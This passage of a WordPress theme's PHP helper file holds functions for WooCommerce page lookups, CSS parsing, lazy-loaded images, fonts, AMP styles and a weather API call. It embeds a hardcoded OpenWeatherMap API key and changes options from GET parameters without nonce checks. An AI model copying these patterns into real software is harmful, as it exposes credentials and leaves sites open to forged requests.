		$url = 'https://www.youtube.com/embed/' . $video_id . $autoplay;
	}

	return apply_filters('pearl_generate_youtube', $url);
}

function pearl_get_cookie($name)
{
	$cookie = (!empty($_COOKIE[$name])) ? $_COOKIE[$name] : '';
	return $cookie;
}

function pearl_shop_page_id()
{
	return get_option('woocommerce_shop_page_id');
}

function pearl_my_account_page_id()
{
	return get_option('woocommerce_myaccount_page_id');
}

function pearl_cart_page_id()
{
	return get_option('woocommerce_cart_page_id');
}

function pearl_is_shop()
{
	return function_exists('is_shop') ? is_shop() : false;
}

function pearl_is_shop_category()
{
	return function_exists('is_product_category') ? is_product_category() : false;
}

function pearl_is_account_page()
{
	return function_exists('is_account_page') ? is_account_page() : false;
}

function pearl_vc_get_element_css_value($vc_css_string, $css_rule_name)
{
	$css_array = strstr($vc_css_string, '{');
	$css_array = str_replace('{', '', $css_array);
	$css_array = str_replace('}', '', $css_array);
	$css_array = explode(';', $css_array);
	$css_array = array_filter($css_array);
	foreach ($css_array as $key => $css_string) {
		$css_single_val = explode(':', $css_string);
		unset($css_array[$key]);
		$css_array[$css_single_val[0]] = $css_single_val[1];
	}

	if (isset($css_array[$css_rule_name])) {
		return str_replace(' !important', '', $css_array[$css_rule_name]);
	}

	return false;
}

add_filter('excerpt_more', 'pearl_new_excerpt_more');

function pearl_new_excerpt_more()
{
	return '...';
}

function pearl_body_bg()
{
	global $post;
	$styles = array();
	$boxed_bg = pearl_get_option('boxed_bg');
	$image = '';
	if (!empty($boxed_bg) && pearl_check_string(pearl_get_option('boxed'))) {
		$styles['background-image'] = "url(\'' . pearl_get_image_url($boxed_bg) . '\'\"'";
//		$image = 'style="background-image:url(\'' . pearl_get_image_url($boxed_bg) . '\'"';
	}
	$bg = get_post_meta($post->ID, 'page_bg_color', true);

	if (!empty($bg)) {
		$styles['background-color'] = '#' . $bg;
	}

	if (!empty($styles)) {
		echo html_entity_decode('style="' . pearl_array_to_style_string($styles) . '"');
	}
}

add_action('init', 'pearl_reset_custom_styles', 100);

function pearl_reset_custom_styles()
{
	if (!empty($_GET['rcs'])) {
		pearl_update_custom_styles();
	}
}

function pearl_pa($array = array())
{
	echo wp_kses_post('<pre>');
	print_r($array);
	echo wp_kses_post('</pre>');
}

function pearl_lazyload_image($id, $size, $image_id = false)
{
	if (!$image_id) {
		$image = pearl_get_VC_post_img_safe($id, $size, 'full');
	} else {
		$image = pearl_get_VC_attachment_img_safe($id, $size, 'full');
	}
	$input = array('src', 'class="');
	$output = array('data-src', 'class="lazyload ');
	return apply_filters('pearl_lazyload_image', str_replace($input, $output, $image));
}

function pearl_get_image_proportion($size, $getSizes = false)
{
	$sizes = explode('x', $size);

	if (!empty($sizes) and count($sizes) > 1) {

		if ($getSizes) return $sizes;

		$sizes = ($sizes[1] / $sizes[0]) * 100;
	} else {
		$sizes = 0;
	}
	return apply_filters('pearl_get_image_proportion', $sizes);
}

function pearl_wp_link_pages()
{
	$defaults = array(
		'before'           => '<div class="page-numbers pearl_wp_link_pages">',
		'after'            => '</div>',
		'link_before'      => '<div class="stm_page_num">',
		'link_after'       => '</div>',
		'next_or_number'   => 'number',
		'separator'        => ' ',
		'nextpagelink'     => esc_html__('Next page', 'pearl'),
		'previouspagelink' => esc_html__('Previous page', 'pearl'),
		'pagelink'         => '%',
		'echo'             => 1
	);

	wp_link_pages($defaults);
}

function pearl_websafe_fonts()
{
	$websafe = array(
		''                    => array(
			'label' => 'Default',
		),
		'Arial'               => array(
			'label' => 'Arial',
		),
		'Arial Black'         => array(
			'label' => 'Arial Black',
		),
		'Comic Sans MS'       => array(
			'label' => 'Comic Sans MS',
		),
		'Courier New'         => array(
			'label' => 'Courier New',
		),
		'Times'               => array(
			'label' => 'Times',
		),
		'Impact'              => array(
			'label' => 'Impact',
		),
		'Lucida Console'      => array(
			'label' => 'Lucida Console',
		),
		'Lucida Sans Unicode' => array(
			'label' => 'Lucida Sans Unicode',
		),
		'Palatino Linotype'   => array(
			'label' => 'Palatino Linotype',
		),
		'Tahoma'              => array(
			'label' => 'Tahoma',
		),
		'Times New Roman'     => array(
			'label' => 'Times New Roman',
		),
		'Trebuchet MS'        => array(
			'label' => 'Trebuchet MS',
		),
		'Verdana'             => array(
			'label' => 'Verdana',
		),
	);

	return apply_filters('pearl_websafe_fonts', $websafe);
}


function pearl_get_cached($name, $callback, $args = array())
{
	if (false == $cachedContent = get_transient($name)) {
		$cachedContent = call_user_func_array($callback, $args);
		set_transient($name, $cachedContent);
	}
	return $cachedContent;
}

add_action('amp_post_template_css', 'pearl_amp_additional_css_styles');

function pearl_amp_additional_css_styles($amp_template)
{ ?>
    html {
    background-color: transparent;
    }

    .amp-wp-article-featured-image {
    margin: 0 16px 30px;
    }

    header.amp-wp-header {
    background-color: #23282d;
    }

    .amp-wp-title {
    margin: 15px 0 0;
    }

    .amp-wp-article-content amp-img.alignleft {
    margin: 8px 25px 1.5em 0;
    }

    .amp-wp-footer,
    .amp-wp-meta.amp-wp-posted-on,
    .amp-wp-meta.amp-wp-byline {
    display: none;
    }

    .amp-wp-article-content amp-img,
    p {
    margin-bottom: 1.5em;
    }

    amp-iframe.amp-wp-enforced-sizes {
    margin: 0 auto 1.5em;
    }

    .amp-wp-header .amp-wp-site-icon {
    background-color: transparent;
    border-color: transparent;
    }
<?php }

add_filter('amp_post_template_data', 'pearl_amp_set_site_icon_url');

function pearl_amp_set_site_icon_url($data)
{
	if (!empty($data['featured_image'])) {
		$data['featured_image'] = '';
	}
	return $data;
}


function pearl_get_temp_by_city_name($city, $units = 'metric')
{
	$api_url = 'http://api.openweathermap.org/data/2.5/weather?q=';
	$app_id = '726d77feab5c453c37f3f57a7ef10177';

	$response = wp_remote_get($api_url . $city . '&APPID=' . $app_id . '&units=' . $units);

	if (!is_wp_error($response) && $response['response']['code'] === 200) {
		$response = json_decode($response['body']);
		$weather = $response->main->temp;
		$icon = $response->weather[0]->icon;

		$response = array(
			'temp' => $weather,
			'icon' => $icon
		);
		return $response;
	}

	return false;
}

function pearl_get_available_post_formats()
{
	$post_formats = array(
		esc_html__('All') => 'all'
	);
	$available_post_formats = get_terms(array('taxonomy' => 'post_format', 'hide_empty' => false));
	if (!empty($available_post_formats)) {
		foreach ($available_post_formats as $post_format) {
			$post_formats[$post_format->name] = $post_format->slug;
		}
	}

	return $post_formats;
}

function pearl_stm_hb_enabled()
{
	return (class_exists('Stm_Header_Builder')) ? true : false;
}

function pearl_vc_add_shadow($prefix = 'shadow')
{
	return array(
		array(
			'type'       => 'textfield',
			'heading'    => esc_html__('Shadow X offset', 'pearl'),
			'param_name' => $prefix . '_x_offset',
			'group'      => esc_html__('Design Options', 'pearl'),
			'std'        => 0
		),
		array(
			'type'       => 'textfield',
			'heading'    => esc_html__('Shadow Y offset', 'pearl'),
			'param_name' => $prefix . '_y_offset',
			'group'      => esc_html__('Design Options', 'pearl'),
			'std'        => 0
		),
		array(
			'type'       => 'textfield',
			'heading'    => esc_html__('Shadow blur', 'pearl'),
			'param_name' => $prefix . '_blur',
			'group'      => esc_html__('Design Options', 'pearl'),
			'std'        => 0
		),
		array(
			'type'       => 'textfield',
			'heading'    => esc_html__('Shadow spread', 'pearl'),
			'param_name' => $prefix . '_spread',
			'group'      => esc_html__('Design Options', 'pearl'),
			'std'        => 0
		),
		array(
			'type'       => 'colorpicker',
			'heading'    => esc_html__('Shadow color', 'pearl'),
			'param_name' => $prefix . '_color',
			'group'      => esc_html__('Design Options', 'pearl'),
			'std'        => 'transparent'
		)
	);
}

function pearl_vpb_animate_style($animation = '')
{
	return 'wpb_animate_when_almost_visible wpb_' . $animation . ' ' . $animation;
}

function pearl_get_titlebox()
{
	$titlebox_style = pearl_get_option('page_title_box_style');
	$tpl = 'partials/global/titlebox/' . $titlebox_style;

	if (empty(locate_template($tpl . '.php'))) {
		$titlebox_style = 'style_1';
	}
	get_template_part('partials/global/titlebox/' . $titlebox_style);
}

if (is_super_admin()) {
	add_action('init', 'pearl_update_layout');

	function pearl_update_layout()
	{
		if (isset($_GET['stm_update_layout'])) {
			$layout = $_GET['stm_update_layout'];
			update_option('stm_layout', $layout);
			echo 'layout updated';
			die;
		}
	}
}

if (!function_exists('pearl_wp_date_format_to_js')) {
	function pearl_wp_date_format_to_js()
	{
		$dateFormat = get_option('date_format');
		$chars = array(
			// Day
			'd' => 'dd',
			'j' => 'd',
			'l' => 'DD',
			'D' => 'D',
			// Month
			'm' => 'mm',
			'n' => 'm',
			'F' => 'MM',
			'M' => 'M',
			// Year
			'Y' => 'yy',
			'y' => 'y',
		);
		return strtr((string)$dateFormat, $chars);
	}
}

if (!function_exists('pearl_wp_time_format_to_js')) {
	function pearl_wp_time_format_to_js()
	{
		$dateFormat = get_option('time_format');
		$chars = array(
			'a' => 'p',
			'A' => 'p',
			'g' => 'h',
			'h' => 'hh',
			'G' => 'H',
			'H' => 'HH',
			'i' => 'mm',
			's' => 'ss'
		);
		return strtr((string)$dateFormat, $chars);
	}
}

function pearl_get_post_type_by_taxonomy($tax = 'category')
{
	global $wp_taxonomies;
	return (isset($wp_taxonomies[$tax])) ? $wp_taxonomies[$tax]->object_type : array();
}

function pearl_is_pearl_post_type()
{
	if (function_exists('stm_post_types')) {
		$pearl_post_types = stm_post_types();
		$pearl_post_types = array_keys($pearl_post_types);
		$pearl_post_types[] = 'post';

		$object = get_queried_object();
		$post_type = $object->post_type;

		return in_array($post_type, $pearl_post_types);
	}

	return false;
}


function pearl_sanitize_image($image)
{
	$allowed = array(
		'img' => array(
			'srcset' => array(),
			'src'    => array(),
			'class'  => array(),
			'width'  => array(),
			'height' => array(),
			'alt'    => array()
        )
	);
	return wp_kses($image, $allowed);
}


/**
 * @param $post_type pearl custom post type without prefix ('stm_')
 * @return bool
 */
function pearl_custom_post_single_enabled($post_type) {
	$post_options = pearl_get_option($post_type);

	if (!empty($post_options['public'])) {
		return $post_options['public'] === 'true';
	}

	return false;
}